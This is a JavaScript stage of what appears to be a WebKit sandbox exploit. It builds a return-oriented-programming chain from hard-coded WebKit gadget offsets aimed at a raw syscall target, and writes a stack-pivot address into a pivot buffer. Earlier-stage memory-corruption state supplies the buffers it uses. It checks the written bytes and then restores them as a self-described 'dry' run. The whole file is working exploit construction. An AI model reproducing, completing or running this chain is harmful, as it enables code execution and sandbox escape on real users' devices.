// Build the previously interrupted generic-syscall chain in owned buffers,
// verify the bytes, and restore without changing a native pointer or calling.
var state = window.__fw14ArrayState;
var plan = window.__fw14NativePlan;
var result;
var phase = "preflight";
var scratchOffset = 0x2f80;
var original = [];
var pivotOriginal = [];
try {
  if (!state || !plan || !state.ownedTypedView ||
      !plan.stack || !plan.pivot || !plan.frame ||
      state.ownedTypedView[0] !== 0x31 ||
      !Number.isSafeInteger(plan.addresses.stack) ||
      !Number.isSafeInteger(plan.addresses.frame))
    throw new Error("dry_plan_missing");
  if (scratchOffset + 136 >= plan.stack.length ||
      scratchOffset < plan.stackOffset + 64)
    throw new Error("dry_scratch_invalid");
  original = Array.from(plan.stack.subarray(scratchOffset, scratchOffset + 136));
  pivotOriginal = Array.from(plan.pivot.subarray(0x38, 0x40));
  function put64(view, at, value) {
    view.setUint32(at, value >>> 0, true);
    view.setUint32(at + 4, Math.floor(value / 4294967296) >>> 0, true);
  }
  var stackView = new DataView(plan.stack.buffer);
  var rawTarget = plan.target - 0x5a0 + 7;
  var errnoHelper = plan.target - 0x6cf0;
  var words = [plan.webkitBase + 0x5c480, 0,
    plan.webkitBase + 0x6e45e, 0,
    plan.webkitBase + 0x10504, 20, rawTarget,
    plan.webkitBase + 0x5c480, plan.addresses.frame,
    plan.webkitBase + 0x548b, errnoHelper,
    plan.webkitBase + 0x5c480, plan.addresses.frame + 8,
    plan.webkitBase + 0x548b, plan.webkitBase + 0x10504,
    0, plan.webkitBase + 0x182f7];
  if (words.length !== 17) throw new Error("dry_chain_word_count");
  phase = "write";
  for (var i = 0; i < words.length; i++) {
    if (i === 15) {
      stackView.setUint32(scratchOffset + i * 8, 0x0a, true);
      stackView.setUint32(scratchOffset + i * 8 + 4, 0xfffffff7, true);
    } else {
      put64(stackView, scratchOffset + i * 8, words[i]);
    }
  }
  if (api && typeof api.markSync === "function")
    api.markSync("raw_dry_chain_written");
  var stackAddress = plan.addresses.stack + scratchOffset;
  for (var b = 0; b < 8; b++)
    plan.pivot[0x38 + b] =
      Math.floor(stackAddress / Math.pow(2, 8 * b)) & 255;
  if (api && typeof api.markSync === "function")
    api.markSync("raw_dry_pivot_written");
  phase = "verify";
  var same = true;
  for (var c = 0; c < words.length; c++) {
    var low = stackView.getUint32(scratchOffset + c * 8, true);
    var high = stackView.getUint32(scratchOffset + c * 8 + 4, true);
    var expectedLow = c === 15 ? 0x0a : words[c] >>> 0;
    var expectedHigh = c === 15 ? 0xfffffff7 :
      Math.floor(words[c] / 4294967296) >>> 0;
    if (low !== expectedLow || high !== expectedHigh)
      same = false;
  }
  var pivotSame = true;
  for (var d = 0; d < 8; d++)
    if (plan.pivot[0x38 + d] !==
        (Math.floor(stackAddress / Math.pow(2, 8 * d)) & 255))
      pivotSame = false;
  result = { id: "sandbox_raw_chain_dry_v1",
    status: same && pivotSame ? "pass" : "fail",
    details: { chain_words: words.length, stack_verified: same,
      pivot_verified: pivotSame } };
} catch (error) {
  result = { id: "sandbox_raw_chain_dry_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 200) } };
} finally {
  if (plan && plan.stack && original.length === 136)
    for (var r = 0; r < 136; r++) plan.stack[scratchOffset + r] = original[r];
  if (plan && plan.pivot && pivotOriginal.length === 8)
    for (var p = 0; p < 8; p++) plan.pivot[0x38 + p] = pivotOriginal[p];
  if (result && result.status !== "error") {
    var restored = true;
    for (var x = 0; x < original.length; x++)
      if (plan.stack[scratchOffset + x] !== original[x]) restored = false;
    for (var y = 0; y < pivotOriginal.length; y++)
      if (plan.pivot[0x38 + y] !== pivotOriginal[y]) restored = false;
    result.details.restored = restored;
    if (!restored) result.status = "fail";
  }
  if (api && typeof api.markSync === "function")
    api.markSync("raw_dry_restored");
}
return [result];
